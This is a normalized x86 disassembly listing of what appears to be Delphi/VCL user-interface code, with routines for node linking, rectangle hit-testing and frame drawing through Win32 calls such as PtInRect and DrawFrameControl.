mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_456b38
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45581c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_456ebc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45581c
mov eax [ esi + 0x64 ]
call sub_455468
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_456ff0
xor edx edx
mov eax esi
call sub_45581c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_455490
adc edx 0x0
mov eax ebx
call sub_455150
mov eax ebx
call sub_4554e0
push esi
push sub_456ff0
xor edx edx
mov eax esi
call sub_45581c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_455c70
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_455150
mov eax [ ebx + 0x14 ]
call sub_4554e0
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_455ce8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_455468
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_455468
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_455468
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_455034
mov esi eax
mov edx 0x2
mov eax ebx
call sub_455034
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_455468
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_455540
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_455568
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455540
call sub_455ce8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455568
call sub_455ce8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4550a0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4550a0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_455f14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44fde8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_41725c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455fa8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_455f14
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_455568
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4557b4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_455568
call sub_455ce8
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_456030
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404038
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_456078
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456270
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_456748
mov eax [ ebp - 0x8 ]
call sub_455744
xor edx edx
push ebp
push sub_456253
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45625a
mov eax [ ebp - 0x8 ]
call sub_455748
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_454f1c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_456030
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4034a4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45523c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_456030
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_44c794
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44d5c4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4032a8
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_456280
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_417298
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425570
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4562d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424990
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_42517c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_42511c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_42511c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424990
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_42511c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_42511c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_456360
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_456280
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4562d8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4562d8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_456280
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4562d8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4562d8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45643c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456592
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44b428
mov eax [ ebp - 0x4 ]
call sub_425154
xor eax eax
push ebp
push sub_456575
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4255f0
xor eax eax
push ebp
push sub_456558
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44fde8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45655f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4255f0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44c214
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4565a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_451be8
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44c2bc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_44c278
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4530b8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4172c0
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_456714
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_456714
pop ecx
mov eax ebx
call sub_4032a8
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_456714
pop ecx
sub_456748
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_456714
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4032a8
xor eax eax
mov [ esi + 0x64 ] eax
sub_4567a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4557b4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4567e0
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4567e0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_456a4d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x8 ]
pop eax
call sub_404300
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax [ ebx + 0x14 ]
call sub_454f40
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x10 ]
pop eax
call sub_404300
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4032a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a54
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_4552f0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_455468
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4554a4
mov eax [ ebx + 0x18 ]
call sub_4552f0
mov [ edx + 0x18 ] eax
push esi
push sub_456ff0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45581c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4554a4
mov eax [ esi + 0x64 ]
call sub_455468
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4032a8
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_456fc8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4032a8
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_454fec
mov edx eax
mov eax edi
call sub_455490
mov eax edi
call sub_4552f0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_456ff0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45581c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_456ff0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_45581c
mov eax [ ebx + 0x14 ]
call sub_4032a8
